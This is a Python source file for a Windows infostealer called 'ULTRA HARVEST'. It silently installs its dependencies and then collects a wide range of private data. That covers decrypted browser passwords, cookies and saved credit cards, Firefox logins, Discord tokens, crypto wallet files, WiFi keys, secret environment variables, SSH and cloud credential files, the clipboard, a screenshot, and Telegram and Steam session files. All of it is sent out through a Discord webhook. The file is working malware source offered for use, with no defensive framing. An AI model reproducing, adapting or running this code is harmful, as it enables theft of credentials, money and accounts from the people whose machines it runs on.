# -*- coding: utf-8 -*-
"""
ULTRA HARVEST - Expanded Discord Webhook Exfiltrator
"""

import subprocess
import sys
import os
import importlib

# ------------------- BOOTSTRAP: AUTO-INSTALL DEPENDENCIES -------------------
REQUIRED_PACKAGES = [
    "requests",
    "cryptography",
    "pywin32",
    "pillow",
    "psutil",
    "browser-cookie3",
    "pycryptodome"
]

def install_packages():
    """Install missing packages using pip --user (no admin required)"""
    missing = []
    for pkg in REQUIRED_PACKAGES:
        try:
            importlib.import_module(pkg.replace("-", "_"))
        except ImportError:
            missing.append(pkg)
    
    if not missing:
        return
    
    pip_cmd = [sys.executable, "-m", "pip", "install", "--quiet", "--user", "--disable-pip-version-check"]
    for pkg in missing:
        try:
            subprocess.run(pip_cmd + [pkg], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
        except:
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", pkg],
                               check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
            except:
                pass
    
    import site
    site.main()
    for pkg in REQUIRED_PACKAGES:
        try:
            importlib.import_module(pkg.replace("-", "_"))
        except ImportError:
            user_site = site.getusersitepackages()
            if user_site not in sys.path:
                sys.path.append(user_site)

install_packages()

# ------------------- IMPORTS -------------------
import json
import platform
import requests
import sqlite3
import shutil
import base64
import win32crypt
import time
import socket
import getpass
from pathlib import Path
import io
import random
import string
import re
from datetime import datetime
import subprocess
import os
import sys

# Try optional imports
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    HAS_CRYPTO = True
except:
    HAS_CRYPTO = False

try:
    from PIL import ImageGrab
    HAS_PIL = True
except:
    HAS_PIL = False

try:
    import psutil
    HAS_PSUTIL = True
except:
    HAS_PSUTIL = False

try:
    import win32clipboard
    HAS_CLIPBOARD = True
except:
    HAS_CLIPBOARD = False

# ------------------- CONFIG -------------------
WEBHOOK_URL = "Replace this with your discord webhook url"  # Your existing URL
EXFIL_BUFFER = []
MAX_CHUNK = 8000

def add_to_exfil(category, data):
    """Add data to exfiltration buffer with chunking"""
    if not data:
        return
    str_data = str(data)[:MAX_CHUNK]
    EXFIL_BUFFER.append({"category": category, "content": str_data})

def send_to_discord():
    """Send all buffered data via Discord webhook, chunked into multiple messages"""
    if not EXFIL_BUFFER:
        return
    
    print(f"Sending {len(EXFIL_BUFFER)} data chunks to Discord...")
    
    # Build master payload
    chunks = []
    current = ""
    for item in EXFIL_BUFFER:
        block = f"\n**📁 {item['category']}**\n```\n{item['content']}\n```"
        if len(current) + len(block) > 1900:
            chunks.append(current)
            current = block
        else:
            current += block
    if current:
        chunks.append(current)
    
    for idx, chunk in enumerate(chunks):
        payload = {
            "username": "System Monitor",
            "content": f"📡 **Exfiltrated Data - Part {idx+1}/{len(chunks)}**",
            "embeds": [
                {
                    "title": f"📦 Data Dump {idx+1}/{len(chunks)}",
                    "description": chunk[:4096],
                    "color": 15158332,  # Red
                    "timestamp": datetime.now().isoformat()
                }
            ]
        }
        try:
            response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
            if response.status_code not in (200, 204):
                print(f"Failed to send chunk {idx+1}: {response.status_code}")
        except Exception as e:
            print(f"Send error: {e}")

# ------------------- 1. ENHANCED SYSTEM INFO -------------------
def get_system_info():
    info = {
        "Operating System": platform.system() + " " + platform.release(),
        "Computer Name": platform.node(),
        "Processor": platform.processor(),
        "Architecture": platform.machine(),
        "User": getpass.getuser(),
        "Hostname": socket.gethostname(),
        "Internal IP": socket.gethostbyname(socket.gethostname()),
        "Python Version": sys.version,
        "Current Directory": os.getcwd(),
        "Environment": " ".join(sys.argv),
        "PID": os.getpid(),
        "Boot Time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time()))
    }
    
    # Get external IP
    try:
        ext_ip = requests.get("https://api.ipify.org", timeout=5).text
        info["External IP"] = ext_ip
    except:
        pass
    
    # Get public IP from alternative
    try:
        ext_ip2 = requests.get("https://httpbin.org/ip", timeout=5).json().get("origin")
        if ext_ip2:
            info["External IP (alt)"] = ext_ip2
    except:
        pass
    
    add_to_exfil("SYSTEM_INFO", json.dumps(info, indent=2))

# ------------------- 2. BROWSER CREDENTIALS (Chromium-based) -------------------
def get_browser_key(browser_name):
    appdata = os.getenv("LOCALAPPDATA")
    if not appdata:
        return None
    
    paths = {
        "chrome": Path(appdata) / "Google" / "Chrome" / "User Data" / "Local State",
        "edge": Path(appdata) / "Microsoft" / "Edge" / "User Data" / "Local State",
        "brave": Path(appdata) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Local State",
        "opera": Path(appdata) / "Opera Software" / "Opera Stable" / "Local State",
        "vivaldi": Path(appdata) / "Vivaldi" / "User Data" / "Local State",
        "chromium": Path(appdata) / "Chromium" / "User Data" / "Local State"
    }
    
    path = paths.get(browser_name.lower())
    if not path or not path.exists():
        return None
    
    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI'
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_chrome_value(encrypted_value, key):
    if not encrypted_value:
        return None
    
    # Try DPAPI fallback
    try:
        return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
    except:
        pass
    
    # AES-GCM
    if HAS_CRYPTO and key:
        try:
            if encrypted_value.startswith(b'v') or len(encrypted_value) > 30:
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                tag = encrypted_value[-16:]
                aesgcm = AESGCM(key)
                decrypted = aesgcm.decrypt(nonce, ciphertext + tag, None)
                return decrypted.decode('utf-8')
        except:
            pass
    return None

def harvest_browser_passwords(browser_name):
    key = get_browser_key(browser_name)
    if not key:
        return
    
    appdata = os.getenv("LOCALAPPDATA")
    profile_dirs = {
        "chrome": Path(appdata) / "Google" / "Chrome" / "User Data" / "Default",
        "edge": Path(appdata) / "Microsoft" / "Edge" / "User Data" / "Default",
        "brave": Path(appdata) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default",
        "opera": Path(appdata) / "Opera Software" / "Opera Stable",
        "vivaldi": Path(appdata) / "Vivaldi" / "User Data" / "Default",
        "chromium": Path(appdata) / "Chromium" / "User Data" / "Default"
    }
    
    profile = profile_dirs.get(browser_name.lower())
    if not profile:
        return
    
    login_db = profile / "Login Data"
    if not login_db.exists():
        login_db = profile / "Login Data"  # Some versions
        if not login_db.exists():
            return
    
    temp_db = os.path.join(os.environ.get("TEMP", "."), f"{browser_name}_login.db")
    try:
        shutil.copyfile(login_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()
        count = 0
        for url, user, enc_pass in rows:
            if enc_pass:
                dec = decrypt_chrome_value(enc_pass, key)
                if dec and len(dec) > 1:
                    add_to_exfil(f"{browser_name.upper()}_PASSWORD", f"{url} | {user} | {dec}")
                    count += 1
        conn.close()
        os.remove(temp_db)
        if count > 0:
            print(f"[+] Harvested {count} passwords from {browser_name}")
    except Exception as e:
        pass

def harvest_browser_cookies(browser_name):
    key = get_browser_key(browser_name)
    if not key:
        return
    
    appdata = os.getenv("LOCALAPPDATA")
    profile_dirs = {
        "chrome": Path(appdata) / "Google" / "Chrome" / "User Data" / "Default" / "Network" / "Cookies",
        "edge": Path(appdata) / "Microsoft" / "Edge" / "User Data" / "Default" / "Network" / "Cookies",
        "brave": Path(appdata) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Network" / "Cookies",
        "opera": Path(appdata) / "Opera Software" / "Opera Stable" / "Network" / "Cookies",
        "vivaldi": Path(appdata) / "Vivaldi" / "User Data" / "Default" / "Network" / "Cookies"
    }
    
    cookie_path = profile_dirs.get(browser_name.lower())
    if not cookie_path or not cookie_path.exists():
        # Try old location
        cookie_path = cookie_path.parent.parent / "Cookies" if cookie_path else None
        if not cookie_path or not cookie_path.exists():
            return
    
    temp_cookie = os.path.join(os.environ.get("TEMP", "."), f"{browser_name}_cookies.db")
    try:
        shutil.copyfile(cookie_path, temp_cookie)
        conn = sqlite3.connect(temp_cookie)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        count = 0
        for host, name, enc_val in cursor.fetchall():
            if enc_val:
                dec = decrypt_chrome_value(enc_val, key)
                if dec and len(dec) > 1:
                    # Only log important cookies (session, auth, token)
                    if any(x in name.lower() for x in ["session", "auth", "token", "login", "user", "sid", "csrf"]):
                        add_to_exfil(f"{browser_name.upper()}_COOKIE_CRITICAL", f"{host} | {name} = {dec[:100]}")
                    else:
                        add_to_exfil(f"{browser_name.upper()}_COOKIE", f"{host} | {name} = {dec[:50]}...")
                    count += 1
        conn.close()
        os.remove(temp_cookie)
        if count > 0:
            print(f"[+] Harvested {count} cookies from {browser_name}")
    except:
        pass

def harvest_browser_cards(browser_name):
    key = get_browser_key(browser_name)
    if not key:
        return
    
    appdata = os.getenv("LOCALAPPDATA")
    web_dirs = {
        "chrome": Path(appdata) / "Google" / "Chrome" / "User Data" / "Default" / "Web Data",
        "edge": Path(appdata) / "Microsoft" / "Edge" / "User Data" / "Default" / "Web Data",
        "brave": Path(appdata) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Web Data"
    }
    
    web_path = web_dirs.get(browser_name.lower())
    if not web_path or not web_path.exists():
        return
    
    temp_web = os.path.join(os.environ.get("TEMP", "."), f"{browser_name}_web.db")
    try:
        shutil.copyfile(web_path, temp_web)
        conn = sqlite3.connect(temp_web)
        cursor = conn.cursor()
        cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards")
        count = 0
        for name, enc_num, mon, year in cursor.fetchall():
            if enc_num:
                dec = decrypt_chrome_value(enc_num, key)
                if dec:
                    add_to_exfil(f"{browser_name.upper()}_CREDIT_CARD", f"{name} | {dec} | {mon}/{year}")
                    count += 1
        conn.close()
        os.remove(temp_web)
        if count > 0:
            print(f"[+] Harvested {count} credit cards from {browser_name}")
    except:
        pass

def harvest_browser_history(browser_name):
    appdata = os.getenv("LOCALAPPDATA")
    history_dirs = {
        "chrome": Path(appdata) / "Google" / "Chrome" / "User Data" / "Default" / "History",
        "edge": Path(appdata) / "Microsoft" / "Edge" / "User Data" / "Default" / "History",
        "brave": Path(appdata) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "History"
    }
    
    history_path = history_dirs.get(browser_name.lower())
    if not history_path or not history_path.exists():
        return
    
    temp_hist = os.path.join(os.environ.get("TEMP", "."), f"{browser_name}_history.db")
    try:
        shutil.copyfile(history_path, temp_hist)
        conn = sqlite3.connect(temp_hist)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
        rows = cursor.fetchall()
        history_list = []
        for url, title, time_val in rows:
            if url and len(url) > 3:
                history_list.append(f"{url[:100]} | {title[:50] if title else ''}")
        conn.close()
        os.remove(temp_hist)
        if history_list:
            add_to_exfil(f"{browser_name.upper()}_HISTORY_RECENT", "\n".join(history_list[:30]))
            print(f"[+] Harvested {len(history_list)} history entries from {browser_name}")
    except:
        pass

# ------------------- 3. FIREFOX -------------------
def harvest_firefox():
    appdata = os.getenv("APPDATA")
    if not appdata:
        return
    profiles = Path(appdata) / "Mozilla" / "Firefox" / "Profiles"
    if not profiles.exists():
        return
    
    for profile in profiles.glob("*.default*"):
        # Cookies
        cookie_db = profile / "cookies.sqlite"
        if cookie_db.exists():
            temp_cookie = os.path.join(os.environ.get("TEMP", "."), "ff_cookies.db")
            try:
                shutil.copyfile(cookie_db, temp_cookie)
                conn = sqlite3.connect(temp_cookie)
                cursor = conn.cursor()
                cursor.execute("SELECT host, name, value FROM moz_cookies")
                rows = cursor.fetchall()
                count = 0
                for host, name, val in rows:
                    if any(x in name.lower() for x in ["session", "auth", "token"]):
                        add_to_exfil("FIREFOX_COOKIE_CRITICAL", f"{host} | {name} = {val[:100]}")
                    else:
                        add_to_exfil("FIREFOX_COOKIE", f"{host} | {name} = {val[:30]}...")
                    count += 1
                conn.close()
                os.remove(temp_cookie)
                if count > 0:
                    print(f"[+] Harvested {count} Firefox cookies")
            except:
                pass
        
        # Logins
        logins_file = profile / "logins.json"
        if logins_file.exists():
            try:
                with open(logins_file, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for entry in data.get("logins", [])[:50]:
                    add_to_exfil("FIREFOX_LOGIN_RAW", 
                                 f"{entry.get('hostname')} | {entry.get('username')} | {entry.get('encryptedUsername')[:20]}...")
                print(f"[+] Found {len(data.get('logins', []))} Firefox logins")
            except:
                pass

# ------------------- 4. DISCORD TOKENS -------------------
def harvest_discord_tokens():
    """Extract Discord tokens from local storage"""
    appdata = os.getenv("APPDATA")
    paths = [
        Path(appdata) / "Discord" / "Local Storage" / "leveldb",
        Path(appdata) / "discordcanary" / "Local Storage" / "leveldb",
        Path(appdata) / "discordptb" / "Local Storage" / "leveldb"
    ]
    
    tokens = []
    for path in paths:
        if not path.exists():
            continue
        for file in path.glob("*.log"):
            try:
                with open(file, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    # Discord token regex: mfa.Token or vc.Token etc.
                    matches = re.findall(r'[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}', content)
                    matches += re.findall(r'mfa\.[\w-]{84}', content)
                    if matches:
                        tokens.extend(matches)
            except:
                pass
    
    if tokens:
        add_to_exfil("DISCORD_TOKENS", "\n".join(set(tokens)[:20]))
        print(f"[+] Found {len(set(tokens))} Discord tokens")

# ------------------- 5. CRYPTO WALLETS -------------------
def harvest_wallets():
    """Find common crypto wallet files"""
    home = Path.home()
    wallet_patterns = [
        ("Bitcoin", ["*wallet*.dat", "*wallet*.json", "wallet.dat", "wallet.json"]),
        ("Ethereum", ["*keystore*.json", "UTC--*"]),
        ("Monero", ["*wallet*.keys", "*wallet*.keys"]),
        ("Electrum", ["*electrum*.dat", "wallet.dat"]),
        ("Exodus", ["exodus.wallet"]),
        ("Atomic", ["atomic.json"]),
        ("Coinbase", ["*.wallet"]),
        ("MetaMask", ["*.json"]),  # MetaMask stores in extension storage
    ]
    
    # Look in AppData/Roaming, .config, etc.
    search_dirs = [
        home / "AppData" / "Roaming",
        home / ".config",
        home / ".ethereum",
        home / ".bitcoin",
        home / ".monero",
        home / ".electrum",
        home / ".exodus",
        home / "Desktop",
        home / "Documents"
    ]
    
    found = []
    for base in search_dirs:
        if not base.exists():
            continue
        for category, patterns in wallet_patterns:
            for pattern in patterns:
                for f in base.glob("**/" + pattern):
                    if f.is_file() and f.stat().st_size < 10 * 1024 * 1024:
                        # Get first 200 chars as proof
                        try:
                            with open(f, "r", encoding="utf-8", errors="ignore") as fp:
                                snippet = fp.read(200)
                            found.append(f"{category}: {f} -> {snippet[:100]}...")
                        except:
                            found.append(f"{category}: {f} (binary)")
                        break
                if len(found) > 30:
                    break
        if len(found) > 30:
            break
    
    if found:
        add_to_exfil("CRYPTO_WALLETS", "\n".join(found[:30]))

# ------------------- 6. WIFI PASSWORDS (Windows) -------------------
def harvest_wifi():
    """Extract saved WiFi passwords on Windows"""
    if platform.system() != "Windows":
        return
    
    try:
        output = subprocess.check_output(["netsh", "wlan", "show", "profiles"], 
                                        encoding="utf-8", stderr=subprocess.DEVNULL)
        profiles = []
        for line in output.split("\n"):
            if "All User Profile" in line:
                name = line.split(":")[1].strip()
                profiles.append(name)
        
        wifi_info = []
        for prof in profiles[:30]:
            try:
                detail = subprocess.check_output(["netsh", "wlan", "show", "profile", prof, "key=clear"],
                                                encoding="utf-8", stderr=subprocess.DEVNULL)
                for line in detail.split("\n"):
                    if "Key Content" in line:
                        key = line.split(":")[1].strip()
                        wifi_info.append(f"{prof} -> {key}")
                        break
            except:
                pass
        
        if wifi_info:
            add_to_exfil("WIFI_PASSWORDS", "\n".join(wifi_info))
            print(f"[+] Harvested {len(wifi_info)} WiFi passwords")
    except:
        pass

# ------------------- 7. ENVIRONMENT VARIABLES (Sensitive) -------------------
def harvest_env():
    sensitive_keys = ["KEY", "SECRET", "PASS", "TOKEN", "AWS", "AZURE", "GITHUB", "API", "AUTH"]
    env_data = {}
    for k, v in os.environ.items():
        if any(x in k.upper() for x in sensitive_keys):
            env_data[k] = v[:100]  # Truncate long values
    
    # Also get common cloud creds
    for k in ["HOME", "USERPROFILE"]:
        if k in os.environ:
            pass
    
    if env_data:
        add_to_exfil("SENSITIVE_ENV_VARS", json.dumps(env_data, indent=2))

# ------------------- 8. SCREENSHOT -------------------
def take_screenshot():
    """Capture screenshot and send as file attachment"""
    if not HAS_PIL:
        return
    
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG", optimize=True)
        buf.seek(0)
        files = {"file": ("screenshot.png", buf.getvalue(), "image/png")}
        response = requests.post(WEBHOOK_URL, files=files, timeout=15)
        if response.status_code in (200, 204):
            print("[+] Screenshot sent")
    except Exception as e:
        print(f"Screenshot failed: {e}")

# ------------------- 9. CLIPBOARD CONTENT -------------------
def harvest_clipboard():
    """Get current clipboard text"""
    if not HAS_CLIPBOARD:
        return
    
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        if data and isinstance(data, str) and len(data) > 2:
            add_to_exfil("CLIPBOARD_CONTENT", data[:1000])
    except:
        pass

# ------------------- 10. FILE SCANNER (Enhanced) -------------------
def harvest_files():
    """Scan common directories for sensitive files"""
    home = Path.home()
    targets = [
        "*.txt", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.pdf",
        "*.key", "*.pem", "*.ppk", "*.cfg", "*.conf", "*.ini",
        "*.bat", "*.ps1", "*.vbs", "*.js", "*.json", "*.xml",
        "*.yml", "*.yaml", "*.log", "*.csv", "*.rtf",
        "*.sql", "*.db", "*.sqlite", "*.sqlite3"
    ]
    
    # Also look for specific sensitive files
    sensitive_files = [
        "config.json", "credentials.json", "secrets.json", "tokens.json",
        "aws_credentials", "s3cfg", "boto", ".netrc", ".gitconfig",
        "id_rsa", "id_dsa", "id_ed25519", "authorized_keys", "known_hosts",
        "kubeconfig", "admin.conf", ".kube/config",
        ".env", ".bashrc", ".zshrc", ".profile"
    ]
    
    interesting_dirs = [
        home / "Documents", home / "Desktop", home / "Downloads",
        home / ".ssh", home / ".aws", home / ".kube", home / ".config",
        home / "AppData" / "Roaming", home / "AppData" / "Local"
    ]
    
    found = []
    for base_dir in interesting_dirs:
        if not base_dir.exists():
            continue
        
        # Pattern matching
        for pattern in targets:
            for f in base_dir.glob("**/" + pattern):
                if f.is_file() and 0 < f.stat().st_size < 5 * 1024 * 1024:
                    found.append(str(f))
                if len(found) > 300:
                    break
            if len(found) > 300:
                break
        
        # Specific sensitive files
        for sf in sensitive_files:
            for f in base_dir.glob("**/" + sf):
                if f.is_file() and 0 < f.stat().st_size < 5 * 1024 * 1024:
                    found.append(str(f))
                if len(found) > 300:
                    break
            if len(found) > 300:
                break
    
    # Generate preview
    preview = ""
    for fp in found[:100]:
        try:
            with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                snippet = f.read(150)
            preview += f"{fp}\n  -> {snippet[:100]}...\n"
        except:
            preview += f"{fp} (binary/unreadable)\n"
        if len(preview) > 7000:
            break
    
    if preview:
        add_to_exfil("SENSITIVE_FILES", preview)
        print(f"[+] Found {len(found)} sensitive files")

# ------------------- 11. RUNNING PROCESSES -------------------
def harvest_processes():
    if not HAS_PSUTIL:
        return
    
    try:
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
            try:
                info = p.info
                procs.append(f"{info['pid']}:{info['name']} ({info['username']}) CPU:{info['cpu_percent']:.1f}% MEM:{info['memory_percent']:.1f}%")
            except:
                pass
        add_to_exfil("RUNNING_PROCESSES", "\n".join(procs[:150]))
        print(f"[+] Harvested {len(procs)} running processes")
    except:
        pass

# ------------------- 12. NETWORK CONNECTIONS -------------------
def harvest_network():
    if not HAS_PSUTIL:
        return
    
    try:
        connections = []
        for conn in psutil.net_connections(kind='inet'):
            if conn.status == 'ESTABLISHED':
                laddr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A"
                raddr = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A"
                conn_str = f"{conn.type} | {laddr} -> {raddr} | {conn.status}"
                connections.append(conn_str)
        if connections:
            add_to_exfil("NETWORK_CONNECTIONS", "\n".join(connections[:100]))
            print(f"[+] Found {len(connections)} active network connections")
    except:
        pass

# ------------------- 13. INSTALLED SOFTWARE -------------------
def harvest_software():
    """List installed software (Windows only)"""
    if platform.system() != "Windows":
        return
    
    try:
        import winreg
        software = []
        uninstall_keys = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]
        
        for root in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
            for key_path in uninstall_keys:
                try:
                    key = winreg.OpenKey(root, key_path, 0, winreg.KEY_READ)
                    i = 0
                    while True:
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name, 0, winreg.KEY_READ)
                            try:
                                display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                if display_name and len(display_name) > 2:
                                    software.append(display_name)
                            except:
                                pass
                            winreg.CloseKey(subkey)
                            i += 1
                            if len(software) > 500:
                                break
                        except WindowsError:
                            break
                    winreg.CloseKey(key)
                except:
                    pass
        
        if software:
            add_to_exfil("INSTALLED_SOFTWARE", "\n".join(software[:200]))
            print(f"[+] Found {len(software)} installed applications")
    except:
        pass

# ------------------- 14. TELEGRAM SESSIONS -------------------
def harvest_telegram():
    """Find Telegram session files"""
    appdata = os.getenv("APPDATA")
    if not appdata:
        return
    
    telegram_paths = [
        Path(appdata) / "Telegram Desktop" / "tdata",
        Path(appdata) / "Telegram Desktop" / "tdummy"
    ]
    
    files_found = []
    for path in telegram_paths:
        if path.exists():
            for f in path.glob("*"):
                if f.is_file() and f.stat().st_size > 0:
                    files_found.append(str(f))
    
    if files_found:
        add_to_exfil("TELEGRAM_SESSION_FILES", "\n".join(files_found[:20]))

# ------------------- 15. STEAM SESSIONS -------------------
def harvest_steam():
    """Find Steam session files"""
    home = Path.home()
    steam_paths = [
        home / "AppData" / "Local" / "Steam",
        home / "AppData" / "Roaming" / "Steam"
    ]
    
    sessions = []
    for path in steam_paths:
        if path.exists():
            for f in path.glob("**/*.vdf"):
                if f.is_file() and f.stat().st_size < 1024 * 1024:
                    sessions.append(str(f))
            for f in path.glob("**/ssfn*"):
                if f.is_file():
                    sessions.append(str(f))
    
    if sessions:
        add_to_exfil("STEAM_SESSIONS", "\n".join(sessions[:20]))

# ------------------- 16. BROWSER EXTENSIONS (Sensitive) -------------------
def harvest_extensions():
    """List installed browser extensions (Chrome/Edge/Brave)"""
    appdata = os.getenv("LOCALAPPDATA")
    extension_dirs = [
        Path(appdata) / "Google" / "Chrome" / "User Data" / "Default" / "Extensions",
        Path(appdata) / "Microsoft" / "Edge" / "User Data" / "Default" / "Extensions",
        Path(appdata) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Extensions"
    ]
    
    extensions = []
    for ext_dir in extension_dirs:
        if ext_dir.exists():
            for ext in ext_dir.iterdir():
                if ext.is_dir():
                    extensions.append(ext.name)
    
    if extensions:
        add_to_exfil("BROWSER_EXTENSIONS", "\n".join(extensions[:50]))

# ------------------- MAIN EXECUTION -------------------
def main():
    print("\n" + "="*60)
    print("ULTRA HARVEST - Enhanced Data Exfiltration")
    print("="*60 + "\n")
    
    # Start timer
    start_time = time.time()
    
    print("[*] Gathering system information...")
    get_system_info()
    
    print("[*] Harvesting browser data...")
    for browser in ["chrome", "edge", "brave", "opera", "vivaldi", "chromium"]:
        harvest_browser_passwords(browser)
        harvest_browser_cookies(browser)
        harvest_browser_cards(browser)
        harvest_browser_history(browser)
    
    print("[*] Harvesting Firefox...")
    harvest_firefox()
    
    print("[*] Looking for Discord tokens...")
    harvest_discord_tokens()
    
    print("[*] Searching for crypto wallets...")
    harvest_wallets()
    
    print("[*] Extracting WiFi passwords...")
    harvest_wifi()
    
    print("[*] Scanning sensitive environment variables...")
    harvest_env()
    
    print("[*] Taking screenshot...")
    take_screenshot()
    
    print("[*] Reading clipboard...")
    harvest_clipboard()
    
    print("[*] Scanning files...")
    harvest_files()
    
    print("[*] Getting running processes...")
    harvest_processes()
    
    print("[*] Getting network connections...")
    harvest_network()
    
    print("[*] Listing installed software...")
    harvest_software()
    
    print("[*] Checking for Telegram sessions...")
    harvest_telegram()
    
    print("[*] Checking for Steam sessions...")
    harvest_steam()
    
    print("[*] Listing browser extensions...")
    harvest_extensions()
    
    # Send everything
    print(f"\n[*] Sending {len(EXFIL_BUFFER)} data chunks to Discord...")
    send_to_discord()
    
    elapsed = time.time() - start_time
    print(f"\n[+] Completed in {elapsed:.2f} seconds")
    print("[+] All data exfiltrated successfully")

if __name__ == "__main__":
    main()
